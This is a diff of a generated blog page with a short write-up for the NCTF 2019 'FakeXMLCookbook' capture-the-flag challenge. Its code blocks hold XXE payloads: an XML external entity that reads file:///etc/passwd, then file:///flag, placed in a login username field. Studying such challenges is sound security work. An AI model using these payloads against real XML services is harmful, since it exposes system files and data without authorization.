@@ -12,16 +12,9 @@
     <meta name="keywords" content="H3ng,"> 
     <meta name="description" content="
 XXE攻击
-
-
-  &amp;admin;123
-注意admin前后有&amp;amp;和;
-
-
-
-  &amp;admin;123
-
-"> 
+&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&amp;gt;
+&amp;lt;!DOCTYPE note [
+  &amp;lt;!ENTITY admin SYSTEM ,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -29,9 +22,9 @@ XXE攻击
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
-<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<meta name="generator" content="Hexo 5.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 <body class="loading">
     <span id="config-title" style="display:none">H3ng</span>
@@ -67,18 +60,18 @@ XXE攻击
         <div class="content markdown">
             <p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163322248.png" alt="image-20210625163322248"></p>
 <p>XXE攻击</p>
-<pre class=" language-php+HTML"><code class="language-php+HTML"><?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE note [
-  <!ENTITY admin SYSTEM "file:///etc/passwd">
-  ]>
-  <user><username>&admin;</username><password>123</password></user></code></pre>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
 <p>注意admin前后有&amp;和;</p>
 <p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163505651.png" alt="image-20210625163505651"></p>
-<pre class=" language-php+HTML"><code class="language-php+HTML"><?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE note [
-  <!ENTITY admin SYSTEM "file:///flag">
-  ]>
-  <user><username>&admin;</username><password>123</password></user></code></pre>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;
+  ]&gt;
+  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
 <p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163906282.png" alt="image-20210625163906282"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
